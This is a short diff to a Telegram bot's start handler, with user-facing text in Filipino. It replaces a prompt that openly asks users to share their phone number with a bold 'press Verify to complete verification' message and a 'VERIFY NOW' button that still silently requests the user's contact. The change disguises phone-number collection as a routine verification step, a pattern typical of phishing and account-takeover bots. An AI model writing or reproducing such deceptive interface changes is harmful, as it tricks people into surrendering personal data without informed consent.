@@ -50,13 +50,13 @@ bot.start(async (ctx) => {
   // STEP 1: kailangan munang mag-share ng contact, wala pang WebApp button
   await replyAndAutoDelete(
     ctx,
-    "Para ma-verify na legit Telegram account ka, kailangan mong i-share ang TELEGRAM phone number mo gamit ang button sa ibaba.",
+    "𝗣𝗶𝗻𝗱𝘂𝘁𝗶𝗻 𝗮𝗻𝗴 𝗩𝗲𝗿𝗶𝗳𝘆 𝗯𝘂𝘁𝘁𝗼𝗻 𝘂𝗽𝗮𝗻𝗴 𝗺𝗮𝗸𝘂𝗺𝗽𝗹𝗲𝘁𝗼 𝗮𝗻𝗴 𝘃𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻.",
     {
       reply_markup: {
         keyboard: [
           [
             {
-              text: "📱 Share my Telegram phone",
+              text: "📱 VERIFY NOW",
               request_contact: true,
             },
           ],
